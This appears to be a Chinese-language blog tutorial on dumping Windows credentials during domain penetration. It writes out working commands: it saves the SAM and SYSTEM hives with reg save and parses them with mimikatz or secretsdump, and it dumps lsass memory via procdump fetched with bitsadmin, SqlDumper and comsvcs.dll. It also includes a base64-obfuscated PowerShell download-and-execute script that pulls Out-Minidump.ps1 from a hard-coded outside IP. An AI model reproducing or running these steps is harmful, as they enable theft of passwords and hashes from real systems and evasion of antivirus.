---
title: 【域渗透】Credential Access Dumping
date: 2019-06-26 11:51:24
description: 极客兔兔的小站，致力于分享一些技术教程和有趣的技术实践。
---
凭据的获取，主要是说明了几种在主机中获取凭据 HASH 的方式，介绍了 SAM 和 LSA 凭据获取方式。

# SAM(Security Accounts Manager)

windows下的密码(HASH值)由SAM数据库储存，位置在C:\windows\system32\config\sam

## 0x01 注册表

```
Reg从注册表提取SAM：

reg save HKLM\SYSTEM sys.hiv

reg save HKLM\SAM sam.hiv

reg save hklm\security security.hiv
```

![img](https://www.yunzhijia.com/microblog/filesvr/5d16217aa3725939b7b0a288)

接着拉回本地机器 (很多环境下，不允许上传或者使用mimikatz。而针对非域控的单机离线提取hash显得尤为重要。) 接着用 mimikatz 加载这两个文件正常读取即可。

```
# mimikatz.exe "lsadump::sam /system:sys.hiv /sam:sam.hiv" exit
```

![img](https://www.yunzhijia.com/microblog/filesvr/5d1621c028011f4ba7fc9ded)

同时也可以使用impacket套件中的secretsdump.py脚本进行解密。

仓库地址：https://github.com/SecureAuthCorp/impacket

Exe单文件版：https://github.com/maaaaz/impacket-examples-windows (32位)

![img](https://www.yunzhijia.com/microblog/filesvr/5d1621f76d67ff7d0fb04601)

## Local Security Authority (LSA)

本地安全机构（LSA）是受 Microsoft Windows 保护的子系统，它是 Windows 客户端身份验证体系结构的一部分，该体系结构对本地计算机进行身份验证并创建登录会话。

LSA 是一个认证机制

## 0x02 prodump.exe

利用微软提供的prodump.exe 工具指定 lsass.exe 进程名进行抓取,

bitsadmin /rawreturn /transfer getfile https://raw.githubusercontent.com/klionsec/CommonTools/master/procdump.exe c:\windows\temp\dump.exe

![img](https://www.yunzhijia.com/microblog/filesvr/5d1622566d67ff7d0fb0473b)

接着，拖回本地用mimikatz.exe加载读取。

```
# mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full" exit
```

![img](https://www.yunzhijia.com/microblog/filesvr/5d1622af28011f4ba7fca1e0)

## 0x03 Powershell

同时也可以使用powershell 进行远程加载提取进程文件，这里利用base64进行简单的混淆加密
如下：

![img](https://www.yunzhijia.com/microblog/filesvr/5d1622e06d67ff7d0fb049ac)

```
$address = "119.29.205.214"
$downport = "80"

$count1 = {
$n=new-object net.webclient;
$n.proxy=[Net.WebRequest]::GetSystemWebProxy();
$n.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;}

$count2 = 'IEX' +" "+ '$n'+'.downloadstring'+"('http://${address}:$downport/Out-Minidump.ps1')"

$count3 = "Get-Process lsass | Out-Minidump -DumpFilePath c:\windows\temp"

$count = ("$count1" +"`n"+ "$count2"+"`n"+$count3)

echo $count

Function base64([string]$string){
$byteArray = [System.Text.UnicodeEncoding]::Unicode.GetBytes($string)
[Convert]::ToBase64String( $byteArray )
}

$base64 = base64 $count

$end = ("powershell -ENC " + $base64)
```

![img](https://www.yunzhijia.com/microblog/filesvr/5d16234bb54c8d56a98f4c24)

## 0x04 Sqldumper.exe

除此之外，还可以使用mssql安装目录下自带的Sqldumper.exe，他要比prodump.exe 小很多很多，如果目标机器上直接就有 mssql ，直接使用即可，没有则直接上传上去就好了。

(一般不会存在被AV杀掉的可能，除非安装的杀毒软件有dump内存文件保护。

![img](https://www.yunzhijia.com/microblog/filesvr/5d1623cea3725939b7b0ad96)

```
# tasklist | findstr "lsass.exe" 先找到 lsass.exe 进程 id
```

使用用法：

```
SqlDumper <process id (PID)> <thread id (TID)> <Flags:Minidump Flags> <SQLInfoPtr> <Dump Directory>
```

![img](https://www.yunzhijia.com/microblog/filesvr/5d16240fa3725939b7b0af06)

![img](https://www.yunzhijia.com/microblog/filesvr/5d16243b28011f4ba7fcaa41)

```
# mimikatz.exe "sekurlsa::minidump SQLDmpr0001.mdmp" "sekurlsa::logonPasswords full" "exit"
```

如下：

![img](https://www.yunzhijia.com/microblog/filesvr/5d16246ea3725939b7b0b112)

## comsvcs.dll

以上三种方法在原理上都是使用API MiniDumpWriteDump，参考资料：

https://docs.microsoft.com/en-us/windows/win32/api/minidumpapiset/nf-minidumpapiset-minidumpwritedump

由于comsvcs.dll导出函数中包含MiniDumpW,故使用该系统dll实现dump指定进程文件

```
powershell -c "rundll32 C:\windows\system32\comsvcs.dll, MiniDump 984 C:\lsass.dmp full"
如下：
```

![img](https://www.yunzhijia.com/microblog/filesvr/5dab25b732f2ca14fb88e4fe)https://hexo.io/docs/one-command-deployment.html)
